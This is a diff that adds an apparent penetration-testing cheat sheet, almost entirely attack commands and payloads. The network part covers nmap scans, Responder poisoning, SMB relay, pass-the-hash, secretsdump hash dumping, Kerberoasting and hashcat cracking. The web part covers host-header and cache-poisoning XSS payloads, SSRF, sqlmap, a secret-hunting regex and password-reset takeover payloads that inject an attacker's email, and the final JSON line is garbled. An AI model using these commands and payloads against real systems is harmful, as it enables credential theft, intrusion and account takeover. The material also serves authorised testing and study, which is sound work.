@@ -1,0 +1,334 @@
+HACKING TECHNIQUES
+
+ 
+NETPEN
+
+
+nmap -sn -n --reason -iL scope.txt | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' > targets.txt
+
+nmap -sL -n -iL scope.txt | grep 'Nmap scan report for' | cut -f 5 -d ' ' > targets.txt
+
+screen -dmS syn && screen -S syn -X stuff "sudo nmap -sV -sS -v --reason -p- --min-rate 1000 -T4 -oA syn -iL targets.txt --open\n"
+
+screen -dmS con && screen -S con -X stuff "sudo nmap -sV -sT -v --reason -p- --min-rate 1000 -T4 -oA con -iL targets.txt --open\n"
+
+screen -dmS udp && screen -S udp -X stuff "sudo nmap -n -sUV --version-intensity 1 -v --reason --max-rtt-timeout=100ms --max-retries=0 --min-rate 1000 -T4 -p- -oA udp -iL targets.txt --open\n"
+
+screen -dmS responder && screen -S responder -X stuff "sudo responder -I eth0\n"
+
+grep and filtering techniques:
+| awk '/<port number>\/open/ {print $2}' - get all ip with specified ports (-oG)
+| awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' - get all hosts up (-oN)
+| awk '/^Host: / && /Ports: / { num=gsub("/open/", ""); print $2, "-", num }' - count all open ports for each ip address (-oG)
+nmap -sL -n -iL scope.txt | grep 'Nmap scan report for' | cut -f 5 -d ' ' > targets.txt - list all ip addresses in scope
+
+kill all screen sessions
+screen -ls | grep '(Detached)' | awk '{print $1}' | xargs -I % -t screen -X -S % quit
+
+nmap -n -sV --script ftp-* -p 21 -oN s_ftp.txt -iL targets.txt --open
+
+nmap -n -sV --script ssh* -p 22 -oN s_ssh.txt -iL targets.txt --open
+
+nmap -n -sV --script *telnet* -p 23 -oN s_telnet.txt -iL targets.txt --open
+
+nmap -n -sV --script smtp-* -p 25,465,587 -oN s_smtp.txt -iL targets.txt --open
+
+nmap -n -sV --script "(http* or ssl*) and not (dos or http-slowloris*)" -p 80,81,443,8000,8080,8443 -oN s_http.txt -iL targets.txt --open
+
+nmap -n -sV --script krb5-enum-users -p 88 -oN s_kerberos.txt -iL targets.txt --open
+
+nmap -n -sV --script "pop3-capabilities or pop3-ntlm-info" -p 110,995 -oN s_pop3.txt -iL targets.txt --open
+
+nmap -n -sV -sSUC -p 111 -oN s_rpcbind.txt -iL targets.txt --open
+
+nmap -n -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 -oN s_ntp.txt -iL targets.txt --open
+
+nmap -n -sU -sV --script "nbstat" -p 137 -oN s_netbios.txt -iL targets.txt --open
+
+nmap -n -sV --script smb-vuln*,smb-enum*,smb-protocols,smb-security-mode,smb2-security-mode -p 139,445 -oN s_smb.txt -iL targets.txt --open
+
+nmap -n -sUV --script snmp-* -p 161,162 -oN s_snmp.txt -iL targets.txt --open
+
+nmap -n -sV --script "ldap* and not brute" -p 389,636,3268,3269 -oN s_ldap.txt -iL targets.txt --open
+
+nmap -n -sV --script ipmi-* -p 623 -oN s_ipmi.txt -iL targets.txt --open
+
+nmap -n -sV --script ms-sql-info,ms-sql-empty-password,ms-sql-brute,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -p 1433 -oN db_mssql.txt -iL targets.txt --open
+
+nmap -n -sV --script oracle-tns-version,oracle-sid-brute -p 1521 -oN s_oracle.txt -iL targets.txt
+
+nmap -n -sV --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 -oN s_nfs.txt -iL targets.txt --open
+
+nmap -n -sV --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p 3306 -oN db_mysql.txt -iL targets.txt --open
+
+nmap -n -sV --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -oN s_rdp.txt -iL targets.txt --open
+
+nmap -n -sU -sV --script sip-* -p 5060 -oN s_sip.txt -iL targets.txt --open
+
+nmap -n -sV --script vnc-* -p 5800,5801,5900,5901 -oN s_vnc.txt -iL targets.txt --open
+
+nmap -n -sTU -A -v --reason --min-rate 1000 -T4 -oA all -iL targets.txt --open
+
+
+Metasploit
+
+sudo service postgresql start && sudo msfdb init && sudo msfconsole -q
+
+Import NMAP Results
+db_import syn.xml con.xml udp.xml
+
+Export NMAP Results
+services -o services_result.csv
+
+Export MSFDB
+db_export db.xml
+
+
+msfconsole -q -x "use <>; set rhosts; run; exit" | tee <>_results.txt
+
+
+Exposed RPC Services
+
+nmap -n -sV -p 135,593 -oN s_rpc.txt -iL targets.txt --open
+
+use auxiliary/scanner/dcerpc/endpoint_mapper
+use auxiliary/scanner/dcerpc/hidden 
+use auxiliary/scanner/dcerpc/management 
+use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+
+impacket-rpcdump -p <port number> <target>
+
+
+Unauthenticated Remote Procedure Call
+
+rpcclient -U "" -N -c 'enumprivs' <target>
+
+
+LDAP Anonymous Bind
+
+ldapsearch -x -s base -b '' "(objectClass=*)" "*" -H ldap://<target>:<port>
+
+
+LLMNR Poisoning Attack
+
+responder -I eth0 -dwv
+
+
+Misconfigured Server Message Block Signing / SMB Relay Attack
+
+nano /etc/responder/Responder.conf 
+turn off http and smb
+
+crackmapexec smb --gen-relay-list targets_smb.txt targets.txt | grep "signing:False"
+impacket-ntlmrelayx -smb2support -tf targets_smb.txt
+sudo responder -I eth0 -dwv
+
+Log Files:
+/usr/share/responder/logs
+
+psexec.py <domain>/<username>:<password>@<target>
+
+psexec.py <username>@<target> -hashes <hashes>
+
+wmiexec.py -hashes <hash_lm>:<hash_nt> <username>@<target> 
+
+hashcat -m 5600 <hash file> /usr/share/wordlists/rockyou.txt -o cracked\cracked.txt --force
+
+
+SMBv1 Enabled
+
+crackmapexec smb targets.txt | grep "SMBv1:True"
+
+
+Pass the Hash Attack
+
+crackmapexec smb <targets> -u <username> -d <domain> -p <password>
+
+crackmapexec smb <targets> -u <username> -H <hash> --local-auth
+
+crackmapexec smb <targets> -u <username> -H <hash> --local-auth --sam --shares --lsa -M lsassy
+
+cmedb
+
+
+Cracking Captured Hashes
+
+hashcat -m 5600 <hash file> <wordlist>
+
+
+Dumping and Cracking Hashes
+
+impacket-secretsdump -outputfile hashes <target domain>/<username>:<password>@<target ip>
+
+impacket-secretsdump <username>@<target ip> -hashes <hash>
+
+hashcat -m 1000 nt.txt <wordlist>
+
+
+IPv6 DNS Takeover
+
+After scanning for open ldap services, get target domain…
+mitm6 -i eth0 -d <target domain>
+impacket-ntlmrelayx -6 -t ldaps://<target ip> -wh fakewpad.<target domain> -l dumps
+impacket-secretsdump -outputfile hashes <target domain>/<username>:<password>@<target ip>
+
+
+Kerberos Pre-Authentication Disabled
+
+ASREPRoast
+
+impacket-GetNPUsers -dc-ip <target> <target domain>/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast -no-pass
+
+hashcat -m 18200 --force -a 0  hashes.asreproast <wordlist>
+
+Kerberoast
+
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<Password> -request -dc-ip <DC_IP> -outputfile hashes.kerberoast
+
+hashcat -m 13100 krb_hash.txt <wordlist>
+
+impacket-GetUserSPNs -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
+
+hashcat -m 13100 --force -a 0 hashes.kerberoast <wordlist>
+
+
+SSH
+
+ssh-audit -T targets.txt > ssh-audit_results.txt
+
+
+SSL/TLS
+
+testssl -iL targets.txt > testssl_results.txt
+sslscan --targets=targets.txt > sslscan_results.txt
+sslyze --targets_in targets.txt > sslyze_results.txt
+nmap -n -sV --script ssl-* -oN tls_ssl_results.txt -iL targets.txt --open
+
+
+Screenshot
+
+Eyewitness
+
+git clone https://github.com/RedSiege/EyeWitness.git
+
+~/EyeWitness/Python/EyeWitness.py --no-prompt -d sc -f targets.txt --web --delay 3 --only-ports 80,443,8443,8080
+
+
+Printer
+
+git clone https://github.com/RUB-NDS/PRET.git
+
+python3 PRET/pret.py <target>
+
+
+
+
+
+WEB
+
+
+WHATWEB
+
+whatweb -a 1 <target>
+
+
+HTTP Compression Enabled (BREACH Vulnerability)
+
+curl -i -H "Accept-Encoding: gzip, deflate" --output - <target>
+
+
+HOST HEADER INJECTION
+
+X-Original-Url: vikingcloud.com
+X-Forwarded-Server: vikingcloud.com
+X-Host: vikingcloud.com
+X-Forwarded-**Host**: vikingcloud.com
+X-Rewrite-Url: vikingcloud.com
+Host: vikingcloud.com
+X-Forwarded-Host: vikingcloud.com
+Referrer: vikingcloud.com
+Origin: vikingcloud.com
+
+Host: javascript:alert(1);
+
+evil.com/redacted.com
+
+curl -is -H "<header>: www.vikingcloud.com" <target>
+
+
+SSRF
+
+<header>: <burp collaborator payload>
+<parameter> = <burp collaborator payload>
+
+curl -is -X $'POST' -H $'<header>: <burp collaborator payload> ' $' <target> '
+
+
+CORS
+
+Origin: <payload>
+
+curl -H 'Origin: <payload>' <target>
+
+
+WEB CACHE POISONING
+
+X-Forwarded-Host: foo
+X-Forwarded-Scheme: nothttps
+?cb=1234
+/random</p><script>alert(1)</script><p>foo
+curl -X PURGE <target>
+
+
+DIR LISTINGS
+
+dirb <target> -o dirb_results.txt
+
+dirsearch -u <target> --random-agent -t 10 -F -o dirsearch_results.txt
+
+gobuster dir -u <target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404,503 -x .php,.xml,.txt -r -q -t 10 --delay 200ms -o gobuster_results.txt
+
+ffuf -u <target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.bak,.zip,.old,.conf,.json -mc 200,204,301,302,307,401,403 -recursion -recursion-depth 2 -t 20 -p 0.1-0.5 -rate 50 -H "User-Agent: Mozilla/5.0" -ac -c -o ffuf_results.json -of json
+
+
+SQLMAP
+
+sqlmap -u <target> --data "username=&password=" --forms --crawl=3 --random-agent --batch --threads=10 --delay=2 --dbs
+
+
+Nuclei
+
+sudo nuclei -l targets.txt -o nuclei_output.txt -silent
+
+
+Nikto
+
+sudo nikto -C all -o nikto_output.txt -host <target>
+
+
+
+Regex for Finding Leaked Api Keys, Secrets, Passwords, Auth Tokens, Etc.
+
+(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]
+
+
+Account takeover using password reset
+
+# Double parameter
+email=victim@xyz.tld&email=hacker@xyz.tld
+
+# Carbon copy
+email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
+
+# Separators
+email=victim@xyz.tld, hacker@xyz.tld
+email=victim@xyz.tld%20hacker@xyz.tld
+email=victim@xyz.%20|hacker@xyz.tld
+
+# No domain
+email=victim
+
+# No tld
+email=victim@xyz
+
+{"email": ["victim@xyz. tld", "hacker@xyz.t1d”1}
